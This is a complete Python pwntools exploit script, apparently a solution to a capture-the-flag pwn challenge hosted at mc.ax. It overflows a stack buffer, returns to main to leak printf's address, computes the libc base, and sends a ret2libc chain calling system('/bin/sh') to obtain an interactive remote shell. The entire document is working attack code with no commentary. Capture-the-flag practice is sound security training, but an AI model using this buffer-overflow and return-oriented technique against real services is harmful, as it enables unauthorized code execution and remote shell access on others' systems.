from pwn import * 

context.arch='amd64'

# cn = process("./bin")
cn = remote("mc.ax", 31568)

libc = ELF("./libc-2.28.so")

main = 0x000000000401186

cn.sendlineafter("get there safely?", flat('a' * 0x20, 0, main))
cn.recvuntil("to get there: ")
printf = int(cn.recv(12), 16)
blibc  = printf - libc.sym['printf']
print("blibc: " + hex(blibc))
system = blibc + libc.sym['system']
binsh  = blibc + next(libc.search(b"/bin/sh\x00"))
poprdi = 0x0000000004012A3
ret    = 0x0000000004012A4

cn.sendline(flat('a'*0x20, 0, ret, poprdi, binsh, system))


cn.interactive()
